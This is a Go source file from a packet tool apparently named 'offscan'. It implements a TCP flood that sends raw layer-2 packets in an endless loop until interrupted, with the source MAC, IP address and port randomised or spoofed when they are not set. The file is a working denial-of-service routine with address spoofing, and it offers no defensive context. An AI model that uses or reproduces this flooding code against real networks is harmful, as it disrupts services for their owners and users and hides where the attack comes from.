/*
 * Copyright (C) 2025 Oliver R. Calazans Jeronimo
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org>.
 */

package flood

import (
	"fmt"
	"time"

	"offscan/internal/pktbuilder"
	"offscan/internal/sockets"
	"offscan/internal/utils"
)



func (f *flooder) validatePort() {
    if f.dstPort == 0 {
        utils.Abort("Port number is required for TCP flood (--dport)")
    }
}



func (f *flooder) sendTcpEndlessly() {
    f.validatePort()
    
    socket  := sockets.NewL2Socket(f.iface)
    builder := pktbuilder.NewTcpPkt()
    ctx     := utils.SignalContext()

    fmt.Println("[+] Sending packets. Press CTRL + C to stop")
    start := time.Now()

    for {
        select {
        case <-ctx.Done():
            fmt.Println("\n[-] Flood interrupted")
            f.duration = time.Since(start).Seconds()
            return
        
		default:
            pkt := f.getTcpPkt(builder)
            socket.Send(pkt)
            f.pktsSent++
        }
    }
}



func (f *flooder) getTcpPkt(builder *pktbuilder.TcpPkt) []byte {
    srcMAC := f.srcMAC
    if srcMAC == nil {
        srcMAC = f.rand.RandomMac()
    }

	srcIP := f.srcIP
    if srcIP == nil {
        srcIP = f.rand.RandomIP()
    }

	srcPort := f.rand.RandomPort()

	return builder.L2Pkt(srcMAC, srcIP, srcPort, f.dstMAC, f.dstIP, f.dstPort)
}